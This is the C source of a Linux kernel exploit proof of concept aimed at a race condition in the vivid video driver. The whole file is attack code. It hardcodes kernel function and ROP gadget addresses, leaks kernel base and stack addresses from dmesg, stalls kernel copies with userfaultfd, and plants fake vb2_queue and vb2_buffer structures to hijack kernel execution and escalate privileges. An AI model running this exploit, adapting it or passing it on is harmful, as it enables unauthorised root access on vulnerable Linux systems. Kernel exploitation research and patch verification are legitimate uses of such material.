/*
 * PoC crashing the kernel using the bug in drivers/media/platform/vivid.
 * Turned out that this bug is exploitable.
 * Just for fun.
 */

#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/xattr.h>
#include <sys/ipc.h> 
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>
#include <vivid.h>
#include <sys/timex.h>

#define _BSD_SOURCE
#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)
#define BUFF_SIZE 0x500
#define THREADS_N 2
#define LOOP_N 100

int flag_s=1;
static int page_size;
char *addr;
char *adjtimex_addr;
unsigned char *buf = NULL;


void errExit(char *msg) {
   	puts(msg);
   	exit(-1);
}


size_t prepare_kernel_cred=0xffffffff810b3350;
size_t commit_creds=0xffffffff810b3000;
size_t run_cmd=0xffffffff810b3870;
size_t call_usermodehelper_exec=0xffffffff810a7070;
size_t call_usermodehelper=0xffffffff810a76d0;
size_t do_task_dead=0xffffffff810be3b0;
size_t pop_rdi_ret=0xffffffff81003191;
size_t pop_rdx_ret=0xffffffff8105f45c;
size_t pop_rcx_ret=0xffffffff8102174c;
size_t pop_rdi_call_rdx=0xffffffff81f0ee94;
size_t push_rax_ret=0xffffffff8103a03c;
size_t swapgs_ret=0xffffffff81069f30;
size_t push_rax_push_rbx_ret=0xffffffff8115bde7;
size_t pop_rbx_ret=0xffffffff8100211c;
size_t call_rdx=0xffffffff810630eb;
size_t xchg_rdi_rsp=0xffffffff818c2031;
size_t pop_r15_r=0xffffffff81003190;
size_t jmp_r15=0xffffffff81c00e30;
size_t kernel_base_leak;
size_t kernel_stack_leak;

/*get kernel_base and kernel_stack from dmesg */
void get_base_addr(){
	FILE *p =popen("dmesg | grep 'RSP: 0018'| tail -1","r");
	char offset[0x20];
	char res[0x100];
	fread(res,0x100,1,p);
	//printf("======%s====\n",res);
	memcpy(offset,res+0x19,0x10);
	pclose(p);
	kernel_stack_leak=strtoul(offset,res,16);
	p =popen("dmesg | grep RCX:","r");
	fread(res,0x100,1,p);
	memcpy(offset,res+0x40,0x10);
	pclose(p);
	kernel_base_leak=strtoul(offset,res,16)-0x145cde8;
	printf("\033[32m [+]kernel_base_leak:%lx kernel_stack_leak:%lx\n \033[0m",kernel_base_leak,kernel_stack_leak);
}

static void *
adjtimex_handler_thread(void *arg)
{
 	static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;
    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
    }
   
   	
    printf("\033[31m [*] The adjtimex_handler_thread page_addr : %p \n \033[0m",page);

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

       /* See what poll() tells us about the userfaultfd */

       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       /* Read an event from the userfaultfd */

       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)
           errExit("read");

       /* We expect only one kind of event; verify that assumption */

       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */
       sleep(10000);
       if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            printf("now , this thread will  sleep\n");
            sleep(10000);
		}
       }
}


static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;
    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
    }
    printf("\033[31m [*] The setxattr_handler_thread page_addr : %p \n \033[0m",page);

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

       /* See what poll() tells us about the userfaultfd */

       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       /* Read an event from the userfaultfd */

       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)
           errExit("read");

       /* We expect only one kind of event; verify that assumption */

       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */
       sleep(10000);
       if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            printf("now , this thread will  sleep\n");
            sleep(10000);
		}
		/*
		struct uffdio_range range;
		range.start = msg.arg.pagefault.address & ~(page_size - 1);
		range.len = page_size;
		if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
			errExit("ioctl-UFFDIO_UNREGISTER");
		if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
			errExit("ioctl-UFFDIO_WAKE");
			*/
        }
 }

void * setxattr_msg(){

	setxattr("/init", "attr", addr+2*page_size-0x408, BUFF_SIZE, 0);
}

void * adjtimex_msg(struct __kernel_timex *adjtimex_buf){
	adjtimex(adjtimex_buf);
}




void init_setxattr_userfaultfd(){
	long uffd;          /* userfaultfd file descriptor */
		         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;
    printf("\033[31m [*] init_setxattr_userfaultfd\n\033[0m");
    page_size = sysconf(_SC_PAGE_SIZE);
    pthread_t th2[100] = { 0 };
    len = 4 * page_size;
    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");
    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */
    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("\033[31m [*] The setxattr_addr anonymous page_addr : %p  \n\033[0m",addr);
    if (addr == MAP_FAILED)
       errExit("mmap");
    uffdio_register.range.start = (unsigned long) addr+2*page_size;
    uffdio_register.range.len = 2*page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");
    /* Create a thread that will process the userfaultfd events */
    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }
}

void init_adjtimex_userfaultfd(){
	long uffd;          /* userfaultfd file descriptor */
		         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;
    len = 4 * page_size;
    printf("\033[31m [*] init_adjtimex_userfaultfd  \n\033[0m");
    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");
    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */
    adjtimex_addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("\033[31m [*] The adjtimex_addr anonymous page_addr : %p  \n\033[0m",adjtimex_addr);
    if (addr == MAP_FAILED)
       errExit("mmap");
    uffdio_register.range.start = (unsigned long) adjtimex_addr+2*page_size;
    uffdio_register.range.len = 2*page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");
    /* Create a thread that will process the userfaultfd events */
    s = pthread_create(&thr, NULL, adjtimex_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }
}

/*
	racer thread
*/

void *racer(void *arg)
{
	unsigned long n = (unsigned long)arg;
	unsigned long cpu_n = (n)%2;
	cpu_set_t single_cpu;
	pthread_t th2[120] = { 0 };
	pthread_t th3 = { 0 };
	int ret = 0;
	unsigned long loop = 0;
	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);
	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0)
		err_exit("[-] sched_setaffinity for a single CPU");
	printf("[+] racer #%lu is on the start on CPU %lu\n", n, cpu_n);
	for (loop = 0; loop < LOOP_N; loop++) {
		int fd = 0;
		//printf("  racer %lu, loop %lu\n", n, loop);
		fd = open("/dev/video0", O_RDWR);
		if (fd < 0)
			err_exit("[-] open /dev/video0");

		read(fd, buf, 0xfffded);
		close(fd);
		usleep(n);
		get_base_addr();
		/*************************************************************************/
		/*
 		init fake_kernel_stack 
 		*/
 		if(kernel_base_leak!=NULL&kernel_stack_leak!=NULL&flag_s){
			flag_s--;
			printf("\033[31m [*] start fill adjtimex_data : %p--%p \n\033[0m",(unsigned long *)(adjtimex_addr+2*page_size-0xc8),(unsigned long *)(adjtimex_addr+2*page_size-0x8));
	
			size_t vb_queue_in_kernel=kernel_stack_leak-0xff88;
			size_t vb_mem_ops_in_kernel =vb_queue_in_kernel;
			size_t fake_stack_in_kernel=vb_queue_in_kernel+0x60;
	
			struct vb2_queue *vb_queue_in_user = mmap(NULL, page_size, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
			if (vb_queue_in_user == MAP_FAILED)
			   errExit("mmap");
			   
			struct vb2_mem_ops *vb_mem_ops_in_user=(char *)vb_queue_in_user;
			size_t fake_stack=(char *)vb_queue_in_user+0x60;
			printf("\033[31m [*] The vb2_queue_in_user : %p \n \033[0m",vb_queue_in_user);
		

			memset(vb_queue_in_user,0x62,0x400);
			vb_queue_in_user->mem_ops=vb_mem_ops_in_kernel;  //0x38
			//vb_queue_in_user->mem_ops->vaddr=xchg_rdi_rsp; //0x58
			vb_mem_ops_in_user->vaddr=xchg_rdi_rsp;
			vb_queue_in_user->uses_qbuf=2; 				   //0x18
	
	
			/*
				Fill data into adjtimex_userfaultfd_monitor_addr  which will be put in kernel stack
			*/
			memcpy(adjtimex_addr+2*page_size-0xd0,vb_queue_in_user,0xc8);
	
		 
		 	
		 	/*
		 		Fill data into setxattr_userfaultfd_monitor_addr which will be puts in kernel_heap
		 	*/
			printf("\033[31m [*] start fill vb2_buffer : %p--%p \n\033[0m",(unsigned long *)(addr+2*page_size-0x408),(unsigned long *)(addr+2*page_size-0x8));


			struct vb2_buffer *vb_buffer=addr+2*page_size-0x408;
			memset(vb_buffer,0,0x400);
			vb_buffer->vb2_queue=vb_queue_in_kernel; //
			vb_buffer->num_planes=1;
			vb_buffer->planes->mem_priv=fake_stack;//
			vb_buffer->planes->bytesused=0x10;
			vb_buffer->planes->length=0x10;
			vb_buffer->planes->min_length=0x10;
			memset(addr+2*page_size-0x408+0x20,0,0x38);
			/********************************************************************************/
			ret = pthread_create(&th3, NULL, adjtimex_msg,adjtimex_addr+2*page_size-0xc8);
			if (ret != 0){
				err_exit("[-] pthread_create for adjtimex_msg");
			}
		
			for(int i=0 ; i<20;i++){
				ret = pthread_create(&th2[i], NULL, setxattr_msg,0);
				if (ret != 0)
					err_exit("[-] pthread_create for setxattr_msg");
			
		}
	}
	}
}

int main(void)
{
	int ret = -1;
	cpu_set_t all_cpus;
	long i = 0;
	pthread_t th[THREADS_N] = { 0 };
	pthread_t th3 = { 0 };
	ret = sched_getaffinity(0, sizeof(all_cpus), &all_cpus);
	if (ret != 0)
		err_exit("[-] sched_getaffinity");

	if (CPU_COUNT(&all_cpus) < 2) {
		printf("[-] not enough CPUs for racing\n");
		exit(EXIT_FAILURE);
	}
	
	printf("[+] we have %d CPUs for racing\n", CPU_COUNT(&all_cpus));
	fflush(NULL);

	buf = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		err_exit("[-] mmap");
	else
		printf("[+] buf for reading is mmaped at %p\n", buf);

	/*
		Init and start setxattr_userfaultfd_monitor,adjtimex_userfaultfd_monitor
	*/
    init_setxattr_userfaultfd();
    init_adjtimex_userfaultfd();
	
	for (i = 0; i < THREADS_N; i++) {
		ret = pthread_create(&th[i], NULL, racer, (void *)i);
		if (ret != 0)
			err_exit("[-] pthread_create for racer");
	}
	for (i = 0; i < THREADS_N; i++) {
		ret = pthread_join(th[i], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join");
	}
	printf("[-] racing is failed, try it again\n");
	exit(EXIT_FAILURE);
}
